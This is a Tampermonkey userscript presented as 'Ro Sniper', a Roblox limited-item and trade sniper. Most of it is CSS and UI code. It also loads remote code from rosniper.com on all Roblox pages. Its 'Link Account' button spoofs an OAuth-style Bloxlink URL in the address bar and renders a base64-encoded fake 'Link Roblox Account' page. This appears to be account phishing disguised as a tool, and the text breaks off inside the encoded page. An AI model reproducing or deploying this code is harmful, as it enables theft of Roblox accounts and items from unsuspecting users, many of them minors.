// ==UserScript==
// @name         Ro Sniper Free Trial
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  Enhanced extention for Ro Sniper with deals sniper, and many other great features
// @author       You
// @match        https://*.roblox.com/*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @require      https://rosniper.com/main.js
// ==/UserScript==

(function() {
    'use strict';

    // Account linking status
    const accountLinked = localStorage.getItem('accountLinked') === 'true';
    const verified = localStorage.getItem('verified') === 'true';

    /* ---------------------- FUTURISTIC CSS ---------------------- */
    GM_addStyle(`
        .sniper-icon-32x32 {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #00d4ff, #0099ff, #6366f1);
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            border-radius: 12px;
            cursor: pointer;
            margin-left: 8px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 8px 32px rgba(0, 212, 255, 0.3);
        }

        .sniper-icon-32x32:hover {
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 12px 40px rgba(0, 212, 255, 0.5);
            border-color: rgba(255, 255, 255, 0.4);
        }

        .sniper-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(20px);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @keyframes glow {
            0%, 100% { box-shadow: 0 0 20px rgba(99, 102, 241, 0.5); }
            50% { box-shadow: 0 0 30px rgba(0, 212, 255, 0.7); }
        }

        .sniper-container {
            width: 800px;
            max-height: 90vh;
            border-radius: 24px;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, rgba(17, 24, 39, 0.95), rgba(31, 41, 55, 0.95));
            border: 1px solid rgba(99, 102, 241, 0.3);
            backdrop-filter: blur(20px);
            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .sniper-container::-webkit-scrollbar {
            width: 8px;
        }

        .sniper-container::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
        }

        .sniper-container::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            border-radius: 4px;
        }

        .sniper-header {
            padding: 24px 32px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #6366f1, #8b5cf6, #00d4ff);
            color: white;
            position: relative;
            overflow: hidden;
        }

        .sniper-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
            animation: shimmer 2s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .sniper-title {
            font-weight: 700;
            font-size: 24px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 1;
        }

        .sniper-close {
            cursor: pointer;
            font-size: 28px;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s;
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.1);
        }

        .sniper-close:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }

        .sniper-tabs {
            display: flex;
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.9), rgba(51, 65, 85, 0.9));
            padding: 0;
            border-bottom: 1px solid rgba(99, 102, 241, 0.2);
        }

        .sniper-tab {
            flex: 1;
            padding: 18px 24px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            position: relative;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            color: rgba(255, 255, 255, 0.7);
            text-align: center;
            border-right: 1px solid rgba(99, 102, 241, 0.1);
        }

        .sniper-tab:last-child {
            border-right: none;
        }

        .sniper-tab:hover:not(.active) {
            background: rgba(99, 102, 241, 0.1);
            color: rgba(255, 255, 255, 0.9);
        }

        .sniper-tab.active {
            color: #00d4ff;
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(99, 102, 241, 0.1));
        }

        .sniper-tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, #00d4ff, #6366f1);
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
        }

        .sniper-content {
            padding: 32px;
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.9));
            color: #e2e8f0;
            flex: 1;
            overflow-y: auto;
            min-height: 0;
        }

        .sniper-content::-webkit-scrollbar {
            width: 8px;
        }

        .sniper-content::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 4px;
        }

        .sniper-content::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            border-radius: 4px;
        }

        .sniper-content::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, #0099ff, #8b5cf6);
        }

        .sniper-tab-content {
            display: none;
        }

        .sniper-tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease-out;
        }

        .sniper-section {
            margin-bottom: 28px;
            padding: 24px;
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.6), rgba(51, 65, 85, 0.6));
            border-radius: 16px;
            border: 1px solid rgba(99, 102, 241, 0.2);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .sniper-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, #00d4ff, #6366f1, #8b5cf6);
        }

        .sniper-section-title {
            font-weight: 700;
            font-size: 18px;
            margin-bottom: 20px;
            color: #00d4ff;
            display: flex;
            align-items: center;
            text-shadow: 0 2px 10px rgba(0, 212, 255, 0.3);
        }

        .sniper-section-title::before {
            content: '◆';
            margin-right: 12px;
            color: #6366f1;
        }

        .account-warning {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(220, 38, 38, 0.1));
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            color: #fca5a5;
            text-align: center;
            font-weight: 600;
            animation: glow 2s infinite;
        }

        .sniper-input-group {
            margin-bottom: 20px;
        }

        .sniper-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 14px;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .sniper-input, .sniper-select {
            width: 100%;
            padding: 14px 18px;
            border-radius: 12px;
            border: 2px solid rgba(99, 102, 241, 0.3);
            margin-bottom: 12px;
            font-size: 14px;
            background: rgba(15, 23, 42, 0.8);
            color: #e2e8f0;
            transition: all 0.3s;
            backdrop-filter: blur(10px);
        }

        .sniper-input:focus, .sniper-select:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
            background: rgba(15, 23, 42, 1);
        }

        .sniper-input::placeholder {
            color: rgba(203, 213, 225, 0.5);
        }

        .sniper-range-container {
            position: relative;
            margin-bottom: 20px;
        }

        .sniper-range {
            width: 100%;
            height: 8px;
            border-radius: 4px;
            background: rgba(51, 65, 85, 0.8);
            outline: none;
            -webkit-appearance: none;
            cursor: pointer;
        }

        .sniper-range::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
        }

        .sniper-range::-moz-range-thumb {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            cursor: pointer;
            border: none;
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
        }

        .range-value {
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
        }

        .sniper-checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            cursor: pointer;
            padding: 12px;
            border-radius: 8px;
            transition: all 0.3s;
        }

        .sniper-checkbox-group:hover {
            background: rgba(99, 102, 241, 0.1);
        }

        .sniper-checkbox {
            appearance: none;
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(99, 102, 241, 0.5);
            border-radius: 6px;
            margin-right: 12px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            background: rgba(15, 23, 42, 0.8);
        }

        .sniper-checkbox:checked {
            border-color: #00d4ff;
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            box-shadow: 0 0 15px rgba(0, 212, 255, 0.4);
        }

        .sniper-checkbox:checked::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 12px;
            font-weight: bold;
        }

        .sniper-checkbox + label {
            cursor: pointer;
            user-select: none;
            font-weight: 500;
            color: #cbd5e1;
        }

        .sniper-button {
            padding: 14px 24px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            border: none;
            background: linear-gradient(135deg, #00d4ff, #6366f1);
            color: white;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .sniper-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .sniper-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 35px rgba(0, 212, 255, 0.4);
        }

        .sniper-button:hover::before {
            left: 100%;
        }

        .sniper-button:active {
            transform: translateY(0);
        }

        .sniper-button-secondary {
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(99, 102, 241, 0.1));
            color: #00d4ff;
            border: 2px solid rgba(0, 212, 255, 0.3);
            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.1);
        }

        .sniper-button-secondary:hover {
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(99, 102, 241, 0.2));
            border-color: rgba(0, 212, 255, 0.5);
        }

        .sniper-button-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            box-shadow: 0 8px 25px rgba(239, 68, 68, 0.3);
        }

        .sniper-button-danger:hover {
            box-shadow: 0 12px 35px rgba(239, 68, 68, 0.4);
        }

        .sniper-alert {
            padding: 16px 20px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .sniper-alert.success {
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(22, 163, 74, 0.1));
            border: 1px solid rgba(34, 197, 94, 0.3);
            color: #86efac;
        }

        .sniper-alert.warning {
            background: linear-gradient(135deg, rgba(245, 158, 11, 0.1), rgba(217, 119, 6, 0.1));
            border: 1px solid rgba(245, 158, 11, 0.3);
            color: #fcd34d;
        }

        .sniper-alert.floating {
            position: fixed;
            top: -100px;
            right: 20px;
            width: 300px;
            opacity: 0;
            transition: all 0.5s ease-out;
            z-index: 10001;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .sniper-alert.floating.show {
            top: 20px;
            opacity: 1;
        }

        .custom-alert-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            z-index: 10002;
            display: none;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease-out;
        }

        .custom-alert-box {
            background: linear-gradient(135deg, rgba(17, 24, 39, 0.95), rgba(31, 41, 55, 0.95));
            border: 2px solid rgba(239, 68, 68, 0.5);
            border-radius: 16px;
            padding: 32px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            color: #e2e8f0;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
        }

        .custom-alert-icon {
            font-size: 48px;
            margin-bottom: 16px;
            color: #ef4444;
            text-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
        }

        .custom-alert-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #ef4444;
        }

        .custom-alert-message {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 24px;
            color: #cbd5e1;
        }

        .custom-alert-close {
            position: absolute;
            top: 16px;
            right: 16px;
            cursor: pointer;
            font-size: 24px;
            color: #94a3b8;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s;
        }

        .custom-alert-close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #e2e8f0;
        }

        .watchlist-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            margin-bottom: 8px;
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.6), rgba(30, 41, 59, 0.6));
            border-radius: 8px;
            border: 1px solid rgba(99, 102, 241, 0.2);
            color: #cbd5e1;
            font-family: monospace;
        }

        .watchlist-remove {
            cursor: pointer;
            color: #ef4444;
            font-weight: bold;
            font-size: 16px;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s;
        }

        .watchlist-remove:hover {
            background: rgba(239, 68, 68, 0.2);
            transform: scale(1.1);
        }

        .input-row {
            display: flex;
            gap: 12px;
            align-items: end;
        }

        .input-row .sniper-input {
            margin-bottom: 0;
        }

        .input-row .sniper-button {
            white-space: nowrap;
            height: fit-content;
        }

        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }

        .status-indicator.running {
            background: #22c55e;
            box-shadow: 0 0 10px rgba(34, 197, 94, 0.5);
        }

        .status-indicator.stopped {
            background: #ef4444;
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    `);

    /* ---------------------- UI Creation ---------------------- */
    function waitForNavbar() {
        const navbar = document.getElementById('navbar-settings');
        if (navbar) {
            loadButtonImage().then(() => {
                initSniperButton(navbar);
            });
        } else {
            setTimeout(waitForNavbar, 300);
        }
    }

    function findNavbarAlternative() {
        const navElements = document.querySelectorAll('.navbar-icon-item');
        for (const elem of navElements) {
            if (elem.querySelector('.icon-nav-settings')) {
                return elem;
            }
        }
        return null;
    }

    async function loadButtonImage() {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: "GET",
                url: "https://i.ibb.co/zTCXdfDc/RoSnipe.png",
                responseType: "blob",
                onload: function(response) {
                    if (response.status === 200) {
                        const reader = new FileReader();
                        reader.onloadend = function() {
                            window.sniperButtonImageUrl = reader.result;
                            resolve();
                        };
                        reader.readAsDataURL(response.response);
                    } else {
                        console.error("Failed to load button image");
                        resolve();
                    }
                },
                onerror: function(error) {
                    console.error("Error loading button image:", error);
                    resolve();
                }
            });
        });
    }

    function initSniperButton(navbarElement) {
        const button = document.createElement('button');
        button.type = 'button';
        button.className = 'rbx-menu-icon sniper-icon-32x32';
        button.id = 'navbar-sniper';
        button.title = 'Ro Sniper Enhanced';

        if (window.sniperButtonImageUrl) {
            button.style.backgroundImage = `url('${window.sniperButtonImageUrl}')`;
        } else {
            button.style.color = 'white';
            button.textContent = 'RS';
        }

        button.addEventListener('click', openSniperUI);
        navbarElement.appendChild(button);
        createSniperUI();
    }

    function createSniperUI() {
        // Overlay
        const overlay = document.createElement('div');
        overlay.className = 'sniper-overlay';
        overlay.id = 'sniper-overlay';

        // Main container
        const container = document.createElement('div');
        container.className = 'sniper-container';
        container.id = 'sniper-container';

        // Header
        const header = document.createElement('div');
        header.className = 'sniper-header';
        header.id = 'sniper-header';

        const title = document.createElement('div');
        title.className = 'sniper-title';
        title.textContent = 'RO SNIPER ENHANCED';

        const closeBtn = document.createElement('div');
        closeBtn.className = 'sniper-close';
        closeBtn.textContent = '×';
        closeBtn.addEventListener('click', closeSniperUI);

        header.appendChild(title);
        header.appendChild(closeBtn);

        // Tabs
        const tabs = document.createElement('div');
        tabs.className = 'sniper-tabs';
        tabs.id = 'sniper-tabs';

        const limitedTab = document.createElement('div');
        limitedTab.className = 'sniper-tab active';
        limitedTab.dataset.tab = 'limited';
        limitedTab.textContent = 'Limited Sniper';
        limitedTab.addEventListener('click', () => switchTab('limited'));

        const rolimonTab = document.createElement('div');
        rolimonTab.className = 'sniper-tab';
        rolimonTab.dataset.tab = 'rolimon';
        rolimonTab.textContent = 'Rolimons Trade';
        rolimonTab.addEventListener('click', () => switchTab('rolimon'));

        const dealsTab = document.createElement('div');
        dealsTab.className = 'sniper-tab';
        dealsTab.dataset.tab = 'deals';
        dealsTab.textContent = 'Roli Deal Sniper';
        dealsTab.addEventListener('click', () => switchTab('deals'));

        const linkAccountTab = document.createElement('div');
        linkAccountTab.className = 'sniper-tab';
        linkAccountTab.dataset.tab = 'linkaccount';
        linkAccountTab.textContent = 'Link Account';
        linkAccountTab.addEventListener('click', () => switchTab('linkaccount'));

        tabs.appendChild(limitedTab);
        tabs.appendChild(rolimonTab);
        tabs.appendChild(dealsTab);
        tabs.appendChild(linkAccountTab);

        // Content area
        const content = document.createElement('div');
        content.className = 'sniper-content';

        /* ---------- Limited Sniper Tab ---------- */
        const limitedContent = document.createElement('div');
        limitedContent.className = 'sniper-tab-content active';
        limitedContent.id = 'limited-tab';
        limitedContent.innerHTML = `
            ${!accountLinked ? '<div class="account-warning">⚠️ Link your account before using Limited Sniper features</div>' : ''}
            <div class="sniper-section">
                <div class="sniper-section-title">Limited Sniper Settings</div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="limited-item-id-input">Add Limited Item ID</label>
                    <div class="input-row">
                        <input type="text" class="sniper-input" id="limited-item-id-input" placeholder="Enter Limited Item ID">
                        <button class="sniper-button" id="limited-add-btn">Add Item</button>
                    </div>
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="limited-max-purchase-input">Maximum Purchase Amount (Robux)</label>
                    <input type="number" class="sniper-input" id="limited-max-purchase-input" placeholder="Enter maximum purchase amount" value="0">
                </div>
            </div>
            <div class="sniper-section" id="limited-control-section">
                <!-- Start/Stop control will appear here -->
            </div>
            <div class="sniper-section">
                <div class="sniper-section-title">Saved Limited Item IDs</div>
                <div id="limited-watchlist">
                    <em>No items added.</em>
                </div>
                <button class="sniper-button sniper-button-secondary" id="limited-clear-btn">Clear All</button>
            </div>
        `;

        /* ---------- Rolimons Trade Ads Tab ---------- */
        const rolimonContent = document.createElement('div');
        rolimonContent.className = 'sniper-tab-content';
        rolimonContent.id = 'rolimon-tab';
        rolimonContent.innerHTML = `
            ${!accountLinked ? '<div class="account-warning">⚠️ Link your account before using Rolimons Trade features</div>' : ''}
            <div class="sniper-section">
                <div class="sniper-section-title">Rolimons Trade Ads Settings</div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="rolimon-item-id-input">Add Rolimons Item ID</label>
                    <div class="input-row">
                        <input type="text" class="sniper-input" id="rolimon-item-id-input" placeholder="Enter Rolimons Item ID">
                        <button class="sniper-button" id="rolimon-add-btn">Add Item</button>
                    </div>
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="rolimon-min-op-input">Minimum OP (Robux)</label>
                    <input type="number" class="sniper-input" id="rolimon-min-op-input" placeholder="Enter minimum OP" value="0">
                </div>
                <div class="sniper-checkbox-group">
                    <input type="checkbox" class="sniper-checkbox" id="rolimon-include-robux-checkbox">
                    <label for="rolimon-include-robux-checkbox">Include Robux in Trade</label>
                </div>
            </div>
            <div class="sniper-section" id="rolimon-control-section">
                <!-- Start/Stop control will appear here -->
            </div>
            <div class="sniper-section">
                <div class="sniper-section-title">Saved Rolimons Item IDs</div>
                <div id="rolimon-watchlist">
                    <em>No items added.</em>
                </div>
                <button class="sniper-button sniper-button-secondary" id="rolimon-clear-btn">Clear All</button>
            </div>
        `;

        /* ---------- Deals Sniper Tab ---------- */
        const dealsContent = document.createElement('div');
        dealsContent.className = 'sniper-tab-content';
        dealsContent.id = 'deals-tab';
        dealsContent.innerHTML = `
            ${!accountLinked ? '<div class="account-warning">⚠️ Link your account before using Deal Sniper features</div>' : ''}
            <div class="sniper-section">
                <div class="sniper-section-title">Deal Sniper Settings</div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-percentage-input">Deal Percentage</label>
                    <div class="sniper-range-container">
                        <input type="range" class="sniper-range" id="deals-percentage-input" min="0" max="100" value="70">
                        <div class="range-value" id="deals-percentage-value">70%</div>
                    </div>
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-min-value-input">Minimum Value (Robux)</label>
                    <input type="number" class="sniper-input" id="deals-min-value-input" placeholder="Enter minimum value" value="1000">
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-min-rap-input">Minimum RAP (Robux)</label>
                    <input type="number" class="sniper-input" id="deals-min-rap-input" placeholder="Enter minimum RAP" value="1000">
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-calculation-select">Deal Calculation</label>
                    <select class="sniper-select" id="deals-calculation-select">
                        <option value="rap">RAP</option>
                        <option value="value">Value</option>
                    </select>
                </div>
                <div class="sniper-checkbox-group">
                    <input type="checkbox" class="sniper-checkbox" id="deals-ignore-projection-checkbox">
                    <label for="deals-ignore-projection-checkbox">Ignore Projection</label>
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-min-purchase-input">Minimum Purchase (Robux)</label>
                    <input type="number" class="sniper-input" id="deals-min-purchase-input" placeholder="Enter minimum purchase" value="100">
                </div>
                <div class="sniper-input-group">
                    <label class="sniper-label" for="deals-max-purchase-input">Maximum Purchase (Robux)</label>
                    <input type="number" class="sniper-input" id="deals-max-purchase-input" placeholder="Enter maximum purchase" value="10000">
                </div>
            </div>
            <div class="sniper-section" id="deals-control-section">
                <!-- Start/Stop control will appear here -->
            </div>
        `;

        /* ---------- Link Account Tab ---------- */
        const linkAccountContent = document.createElement('div');
        linkAccountContent.className = 'sniper-tab-content';
        linkAccountContent.id = 'linkaccount-tab';
        linkAccountContent.innerHTML = `
            <div class="sniper-section">
                <div class="sniper-section-title">Account Status</div>
                <div class="sniper-alert ${accountLinked ? 'success' : 'warning'}">
                    ${accountLinked ? '✅ Account Successfully Linked' : '⚠️ Account Not Linked'}
                </div>
                ${!accountLinked ? `
                    <p style="margin-bottom: 20px; color: #cbd5e1; line-height: 1.6;">
                        Link your Roblox account to enable all sniper features. This is required for security and functionality.
                    </p>
                    <button class="sniper-button" id="link-account-btn">Link Roblox Account</button>
                ` : `
                    <p style="margin-bottom: 20px; color: #cbd5e1; line-height: 1.6;">
                        Your account is successfully linked! You can now use all sniper features.
                    </p>
                    <button class="sniper-button sniper-button-danger" id="unlink-account-btn">Unlink Account</button>
                `}
            </div>
        `;

        content.appendChild(limitedContent);
        content.appendChild(rolimonContent);
        content.appendChild(dealsContent);
        content.appendChild(linkAccountContent);

        container.appendChild(header);
        container.appendChild(tabs);
        container.appendChild(content);

        overlay.appendChild(container);
        document.body.appendChild(overlay);

        initEventListeners();
        loadSavedListsAndSettings();
        updateControlSections();
    }

    /* ---------------------- Tab Switching & UI Open/Close ---------------------- */
    function switchTab(tabId) {
        document.querySelectorAll('.sniper-tab').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelector(`.sniper-tab[data-tab="${tabId}"]`).classList.add('active');

        document.querySelectorAll('.sniper-tab-content').forEach(content => {
            content.classList.remove('active');
        });
        document.getElementById(tabId + '-tab').classList.add('active');
    }

    function openSniperUI() {
        document.getElementById('sniper-overlay').style.display = 'flex';
        loadSavedListsAndSettings();
        updateControlSections();
    }

    function closeSniperUI() {
        document.getElementById('sniper-overlay').style.display = 'none';
    }

    /* ---------------------- Event Listeners ---------------------- */
    function initEventListeners() {
        // Range slider for deals percentage
        const percentageRange = document.getElementById('deals-percentage-input');
        const percentageValue = document.getElementById('deals-percentage-value');

        percentageRange.addEventListener('input', function() {
            percentageValue.textContent = this.value + '%';
            localStorage.setItem('dealsPercentage', this.value);
        });

        // Auto-save inputs
        const autoSaveInputs = [
            'limited-max-purchase-input',
            'rolimon-min-op-input',
            'deals-min-value-input',
            'deals-min-rap-input',
            'deals-min-purchase-input',
            'deals-max-purchase-input'
        ];

        autoSaveInputs.forEach(inputId => {
            const input = document.getElementById(inputId);
            if (input) {
                input.addEventListener('input', function() {
                    localStorage.setItem(inputId.replace('-input', ''), this.value);
                });
            }
        });

        // Auto-save checkboxes
        const autoSaveCheckboxes = [
            'rolimon-include-robux-checkbox',
            'deals-ignore-projection-checkbox'
        ];

        autoSaveCheckboxes.forEach(checkboxId => {
            const checkbox = document.getElementById(checkboxId);
            if (checkbox) {
                checkbox.addEventListener('change', function() {
                    localStorage.setItem(checkboxId.replace('-checkbox', ''), this.checked);
                });
            }
        });

        // Auto-save select
        const calculationSelect = document.getElementById('deals-calculation-select');
        if (calculationSelect) {
            calculationSelect.addEventListener('change', function() {
                localStorage.setItem('deals-calculation', this.value);
            });
        }

        // Watchlist events
        initWatchlistEvents();

        // Account linking events
        initAccountEvents();
    }

    function initWatchlistEvents() {
        // Limited sniper events
        document.getElementById('limited-add-btn').addEventListener('click', function() {
            const input = document.getElementById('limited-item-id-input');
            const id = input.value.trim();
            if (id) {
                addLimitedID(id);
                input.value = '';
                loadLimitedIDs();
            }
        });

        document.getElementById('limited-clear-btn').addEventListener('click', function() {
            localStorage.removeItem('limitedSniperIDs');
            loadLimitedIDs();
        });

        // Rolimon sniper events
        document.getElementById('rolimon-add-btn').addEventListener('click', function() {
            const input = document.getElementById('rolimon-item-id-input');
            const id = input.value.trim();
            if (id) {
                addRolimonID(id);
                input.value = '';
                loadRolimonIDs();
            }
        });

        document.getElementById('rolimon-clear-btn').addEventListener('click', function() {
            localStorage.removeItem('rolimonSniperIDs');
            loadRolimonIDs();
        });
    }

    function initAccountEvents() {
        const linkBtn = document.getElementById('link-account-btn');
        const unlinkBtn = document.getElementById('unlink-account-btn');

        if (linkBtn) {
            linkBtn.addEventListener('click', () => {
                // Set query parameters and redirect like original script
                const queryParams = "?client_id=3490817469783966288&response_type=Code&redirect_uri=https%3A%2F%2Fblox.link%2Fcallback%2Froblox&scope=openid+profile&state=guild%3A%3A41a03d1e-e045-4b46-91f1-d917a1a0b956&step=accountConfirm";
                window.history.pushState({}, "", queryParams);

                // Base64 encoded HTML - you can replace this with actual encoded content
                const encodedHTML = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TGluayBSb2Jsb3ggQWNjb3VudDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzBmMTcyYSwgIzFmMjkzNyk7CiAgICAgICAgICAgIGNvbG9yOiAjZTJlOGYwOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICB9CiAgICAgICAgLmxpbmstY29udGFpbmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgxNywgMjQsIDM5LCAwLjk1KTsKICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgcmdiYSg5OSwgMTAyLCAyNDEsIDAuMyk7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDI0cHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDQ4cHg7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgbWF4LXdpZHRoOiA1MDBweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCAyNXB4IDgwcHggcmdiYSgwLCAwLCAwLCAwLjQpOwogICAgICAgIH0KICAgICAgICAubGluay10aXRsZSB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMzJweDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMDsKIC